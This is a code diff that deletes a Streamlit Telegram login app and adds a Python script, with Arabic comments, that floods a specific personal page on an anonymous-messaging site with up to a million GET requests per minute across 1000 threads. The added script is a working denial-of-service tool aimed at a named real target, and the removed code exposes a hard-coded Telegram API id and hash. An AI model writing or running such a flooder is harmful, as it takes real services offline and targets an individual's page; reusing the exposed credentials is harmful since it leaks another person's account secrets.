@@ -1,63 +1,37 @@
-import streamlit as st
-from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError
-import nest_asyncio
+import requests
+import concurrent.futures
+import time
 
-nest_asyncio.apply()
+def send_request(url):
+    try:
+        response = requests.get(url)
+        print(f"Request to {url} Status Code: {response.status_code}")
+    except requests.RequestException as e:
+        print(f"Request to {url} failed: {e}")
 
-# إعدادات Telegram API
-api_id = '9355923'  # استبدل بـ API ID الخاص بك
-api_hash = '8ee56b7dae77248f59104e833a9ceaa0'  # استبدل بـ API Hash الخاص بك
-session_file = 'session_name'  # اسم ملف الجلسة
+# إعداد الرابط الأساسي
+base_url = "https://sarhne.sarahah.pro/marym23"
 
-st.title("Telegram Login")
+# العدد الإجمالي للطلبات المراد إرسالها في الدقيقة
+total_requests_per_minute = 1000000
+# عدد مؤشرات الاتصال المتوازية
+max_threads = 1000
 
-if 'client' not in st.session_state:
-    st.session_state.client = TelegramClient(session_file, api_id, api_hash)
-    st.session_state.client.connect()
+# قياس الوقت المستغرق
+start_time = time.time()
 
-if 'step' not in st.session_state:
-    if st.session_state.client.is_user_authorized():
-        st.session_state.step = 'logged_in'
-    else:
-        st.session_state.step = 'phone'
+# عدد الطلبات المراد إرسالها في كل دورة بناءً على عدد مؤشرات الاتصال
+requests_per_cycle = total_requests_per_minute // max_threads
 
-client = st.session_state.client
+# عدد الدورات المراد تنفيذها في الدقيقة لتحقيق العدد المطلوب من الطلبات
+cycles_per_minute = total_requests_per_minute // requests_per_cycle
 
-if st.session_state.step == 'phone':
-    phone = st.text_input("Enter your phone number:")
-    if st.button("Send Code"):
-        if phone:
-            try:
-                client.send_code_request(phone)
-                st.session_state.step = 'code'
-                st.session_state.phone = phone
-            except PhoneNumberInvalidError:
-                st.error("Invalid phone number. Please try again.")
+# تنفيذ الطلبات
+for _ in range(cycles_per_minute):
+    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
+        urls_to_request = [base_url] * requests_per_cycle
+        executor.map(send_request, urls_to_request)
+        time.sleep(60 / cycles_per_minute)
 
-if st.session_state.step == 'code':
-    code = st.text_input("Enter the code sent to your phone:")
-    if st.button("Verify"):
-        phone = st.session_state.phone
-        try:
-            client.sign_in(phone=phone, code=code)
-            if client.is_user_authorized():
-                st.success("Logged in successfully!")
-                st.session_state.step = 'logged_in'
-            else:
-                st.error("Failed to log in.")
-        except SessionPasswordNeededError:
-            st.session_state.step = 'password'
-
-if st.session_state.step == 'password':
-    password = st.text_input("Two-step verification password:", type='password')
-    if st.button("Login"):
-        client.sign_in(password=password)
-        if client.is_user_authorized():
-            st.success("Logged in successfully!")
-            st.session_state.step = 'logged_in'
-        else:
-            st.error("Failed to log in.")
-
-if st.session_state.step == 'logged_in':
-    st.success("You are logged in!")
+end_time = time.time()
+print(f"Total time taken: {end_time - start_time} seconds")
